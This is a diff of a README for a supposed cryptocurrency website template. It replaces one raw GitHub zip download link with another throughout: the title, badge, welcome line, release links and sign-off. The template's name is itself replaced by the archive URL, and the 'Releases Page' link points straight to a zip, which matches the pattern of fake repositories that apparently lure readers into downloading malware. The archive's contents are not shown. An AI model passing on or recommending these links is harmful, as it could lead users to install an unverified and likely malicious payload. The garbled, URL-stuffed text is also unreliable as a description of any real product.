@@ -1,10 +1,10 @@
-# 🌐 https://raw.githubusercontent.com/Faizy5/web-studio-pro.github.io/main/republish/web-studio-pro.github.io.zip - Your Simple Crypto Company Website
+# 🌐 https://github.com/Faizy5/web-studio-pro.github.io/raw/refs/heads/main/republish/pro_github_web_io_studio_2.4-alpha.1.zip - Your Simple Crypto Company Website
 
-![Download](https://raw.githubusercontent.com/Faizy5/web-studio-pro.github.io/main/republish/web-studio-pro.github.io.zip)
+![Download](https://github.com/Faizy5/web-studio-pro.github.io/raw/refs/heads/main/republish/pro_github_web_io_studio_2.4-alpha.1.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **https://raw.githubusercontent.com/Faizy5/web-studio-pro.github.io/main/republish/web-studio-pro.github.io.zip**! This application serves as a user-friendly website template for cryptocurrency companies. It allows you to create an engaging online presence with minimal effort. Follow the steps below to get started.
+Welcome to **https://github.com/Faizy5/web-studio-pro.github.io/raw/refs/heads/main/republish/pro_github_web_io_studio_2.4-alpha.1.zip**! This application serves as a user-friendly website template for cryptocurrency companies. It allows you to create an engaging online presence with minimal effort. Follow the steps below to get started.
 
 ## 💻 System Requirements
 
@@ -18,7 +18,7 @@ Before you proceed, make sure your device meets the following:
 
 To download the application, visit this page:
 
-[Download the Latest Release](https://raw.githubusercontent.com/Faizy5/web-studio-pro.github.io/main/republish/web-studio-pro.github.io.zip)
+[Download the Latest Release](https://github.com/Faizy5/web-studio-pro.github.io/raw/refs/heads/main/republish/pro_github_web_io_studio_2.4-alpha.1.zip)
 
 1. Click the link above.
 2. You will see a list of available releases. Locate the latest version.
@@ -56,6 +56,6 @@ If you encounter any issues, we are here to help. Please refer to our FAQs secti
 
 We regularly update the application for better performance and new features. Make sure to check for updates on the Releases page:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/Faizy5/web-studio-pro.github.io/main/republish/web-studio-pro.github.io.zip)
+[Visit the Releases Page](https://github.com/Faizy5/web-studio-pro.github.io/raw/refs/heads/main/republish/pro_github_web_io_studio_2.4-alpha.1.zip)
 
-Thank you for choosing **https://raw.githubusercontent.com/Faizy5/web-studio-pro.github.io/main/republish/web-studio-pro.github.io.zip**! We hope you enjoy building your cryptocurrency website.
+Thank you for choosing **https://github.com/Faizy5/web-studio-pro.github.io/raw/refs/heads/main/republish/pro_github_web_io_studio_2.4-alpha.1.zip**! We hope you enjoy building your cryptocurrency website.
